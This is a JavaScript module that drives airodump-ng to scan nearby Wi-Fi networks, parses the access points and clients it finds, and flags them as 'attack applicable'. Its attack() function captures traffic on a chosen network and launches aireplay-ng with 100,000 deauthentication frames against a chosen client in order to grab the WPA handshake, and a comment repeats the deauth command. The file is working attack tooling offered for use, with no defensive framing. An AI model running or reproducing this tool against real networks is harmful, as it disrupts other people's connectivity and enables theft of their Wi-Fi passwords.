'use strict';

const os = require('os');
const spawn = require('child_process').spawn;
const EventEmitter = require('events').EventEmitter;

const IFace = require('./interface');
const aireplay = require('./aireplay-ng');

/*

CH 13 ][ Elapsed: 3 mins ][ 2016-11-16 20:46

BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

A0:F3:C1:EF:CE:30  -54      231       14    0   1  54e. OPN              South Gargoyle
54:04:A6:5B:19:30  -64      454       52    0   3  54e  WPA2 TKIP   PSK  North Gargoyle

BSSID              STATION            PWR   Rate    Lost    Frames  Probe

A0:F3:C1:EF:CE:30  74:2F:68:B6:85:88  -47    0e- 0e     0       18
54:04:A6:5B:19:30  60:FE:1E:49:87:C3  -51   24e- 1      0       66

*/

/*

CH 14 ][ Elapsed: 1 min ][ 2016-11-16 21:28 ][ WPA handshake: 54:04:A6:5B:19:30

BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

A0:F3:C1:EF:CE:30  -56      125        6    0   1  54e. OPN              South Gargoyle
54:04:A6:5B:19:30  -70      218       28    0   3  54e  WPA2 TKIP   PSK  North Gargoyle

BSSID              STATION            PWR   Rate    Lost    Frames  Probe

54:04:A6:5B:19:30  60:FE:1E:49:87:C3  -42   24e- 1      0       14
54:04:A6:5B:19:30  74:2F:68:B6:85:88  -55   54e- 1e     0       31

*/

function parse(str) {

  const headers = [
    'BSSID PWR Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID',
    'BSSID STATION PWR Rate Lost Frames Probe'
  ];

  let result = {},
    headLine = '',
    headChunks = [],
    headPrefix;

  let lines = str.trim().split(new RegExp(os.EOL, 'g'));

  for (let i = 0; i < lines.length; i++) {

    lines[i] = lines[i].replace(/(\u001b\[J)|(\u001b\[1\;1H)/g, '').trim();

    if (lines[i].match(/Elapsed/)) {
      let chunks = lines[i].split('][');
      if (chunks[chunks.length - 1].match(/handshake/)) {
        result.handshake = chunks[chunks.length - 1].match(/([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})/)[0];
      }
      continue;
    }
    if (!lines[i].trim()) {
      continue;
    }

    // Detect header
    let headerIndex = headers.indexOf(lines[i].replace(/\s+/g, ' ').trim());

    if (~headerIndex) {
      headLine = lines[i];
      headChunks = headLine.split(/\s+/g);
      headPrefix = headerIndex ? 'stations' : 'aps';
      continue;
    }

    if (!headPrefix) {
      continue;
    }

    result[headPrefix] = result[headPrefix] || [];

    let item = {};
    for (let j = 0; j < headChunks.length; j++) {
      let start = headLine.indexOf(headChunks[j]);

      let nextJ = j + 1;

      let end = headChunks[nextJ] ? headLine.indexOf(headChunks[nextJ]) : lines[i].length;

      let len  = end - start;

      item[headChunks[j]] = lines[i].substr(start, len).trim();
    }

    result[headPrefix].push(item);
  }

  return result;
}

class Data {
  constructor({handshake = '', aps = [], stations = []} = {}) {
    this.handshake = handshake;
    this.aps = aps;
    this.stations = stations;

    this.currentStationNum = 0;
    this.items = this.getAttackApplicable();
  }
  getAttackApplicable() {
    let applicable = {};

    this.stations.forEach((station) => {
      applicable[station.STATION] = {
        BSSID: station.BSSID,
        'STATION-PWR': station.PWR,
        Frames: station.Frames
      };
    });

    for (let station in applicable) {
      this.aps.forEach((ap) => {
        if (applicable[station].BSSID === ap.BSSID) {
          applicable[station]['AP-PWR'] = ap['PWR'];
          applicable[station]['#Data'] = ap['#Data,'];
          applicable[station]['Beacons'] = ap['Beacons'];
          applicable[station]['CH'] = ap['CH'];
          applicable[station]['ENC'] = ap['ENC'];
          applicable[station]['CIPHER'] = ap['CIPHER'];
          applicable[station]['AUTH'] = ap['AUTH'];
          applicable[station]['ESSID'] = ap['ESSID'];
        }
      });

      // Have no AP, so remove it
      if (!applicable[station].CH) {
        delete applicable[station];
      }

    }

    return applicable;
  }
  moveUpCurrent() {
    let len;
    if (Data.currentStationNum) {
      Data.currentStationNum--;
    } else {
      len = Object.keys(this.items).length;
      Data.currentStationNum =  len > 0 ? len - 1 : 0;
    }
  }
  moveDownCurrent() {
    if (Data.currentStationNum < Object.keys(this.items).length) {
      Data.currentStationNum++;
    } else {
      Data.currentStationNum = 0;
    }

    //console.log('current: ', Data.currentStationNum);

    //process.exit();

  }
  getCurrentNum() {
    return Data.currentStationNum;
  }
  getCurrentStation() {
    const num = this.getCurrentNum();
    let station = {};

    Object.keys(this.items).forEach((mac, index) => {
      if (index === num) {
        station = Object.assign({}, this.items[mac]);
        station['MAC'] = mac;
      }
    });



    return station;
  }
}

Data.currentStationNum = 0;


const self = new EventEmitter();

self.data = new Data();
self.iface = new IFace();

self.run = (iface, ...options) => {

  self.iface = iface || self.iface;

  let params = [...options, self.iface.toString()];

  const proc = self.proc = spawn('airodump-ng', params);

  return new Promise((resolve, reject) => {

    proc.on('error', (err) => reject(err));

    proc.on('close', (code) => console.log(`Child process exited with code ${code}`));
    //proc.stdout.on('data', (data) => console.log(data.toString('UTF-8'))); // ???

    // airodump-ng dumps data into stderr, not stdout
    proc.stderr.on('data', (data) => {

      data = parse(data.toString('UTF-8'));

      self.emit('data', self.data = new Data(data));
    });

    resolve(self);
  });

};

self.quit = () => {
  self.proc && self.proc.stdin.pause() && self.proc.kill();
};

/*
self.on('data', (data) => {
  self.stations = Object.keys(data.getAttackApplicable());
});
*/

self.attack = () => {

  const station = self.data.getCurrentStation();

  if (!Object.keys(station).length) {
    return;
  }

  //console.log(station);

  self.quit();

  /*
   {
   BSSID: '54:04:A6:5B:19:30',
   'STATION-PWR': '-1',
   Frames: '1',
   'AP-PWR': '-60',
   '#Data': '0',
   Beacons: '63',
   CH: '3',
   ENC: 'WPA2',
   CIPHER: 'TKIP',
   AUTH: 'PSK',
   ESSID: 'North',
   MAC: '74:2F:68:B6:85:88'
   }
   */

  //return airodump.run(iface, '--bssid', '54:04:A6:5B:19:30', /*'-w', 'psk',*/ '-c', '3');

  return self.run(null,
    '--bssid', station.BSSID,
    '-w', station.ESSID,
    '-c', station.CH
  ).then((airodump) => {

    // aireplay-ng --deauth 10 -a 64:66:B3:45:C7:F4 -c DC:85:DE:3A:53:BD  mon0
    return aireplay.run(self.iface,
      '--deauth', '100000',
      '-a', station.BSSID,
      '-c', station.MAC
    );
  });

};

self.moveUpStation = () => self.data.moveUpCurrent();
self.moveDownStation = () => self.data.moveDownCurrent();

process.on('exit', () => self.quit());

module.exports = self;
